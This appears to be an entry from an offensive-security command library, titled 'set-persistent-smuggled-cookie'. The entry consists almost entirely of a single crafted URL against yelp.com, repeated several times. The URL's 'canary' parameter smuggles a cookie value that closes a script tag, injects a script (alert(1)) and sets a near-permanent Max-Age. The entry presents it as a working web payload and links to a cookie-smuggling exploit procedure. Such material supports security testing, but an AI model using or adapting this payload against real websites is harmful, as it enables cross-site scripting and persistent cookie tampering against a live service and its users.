---
data: >-
  https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3B%20Max%2DAge%3D99999999
tags:
  - cookie-smuggling
type: command
executor: bash
platforms:
  - Web
id: e48ac350-3178-448c-b292-0873413a39eb
created_at: '2025-12-13T23:56:20.362Z'
updated_at: '2025-12-13T23:56:20.362Z'
verified: false
validated: true
submitted: true
---
# set-persistent-smuggled-cookie

## Command

```bash
https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3B%20Max%2DAge%3D99999999
```

## Description

URL to set persistent smuggled cookie.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `canary` | Smuggled value with Max-Age | Yes |

## Examples

### Basic Usage

```bash
https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3B%20Max%2DAge%3D99999999
```

## Expected Output

Sets persistent cookie

## Related

- [[procedures/Exploit-Broken-Cookie-Parsing-for-Smuggling]]
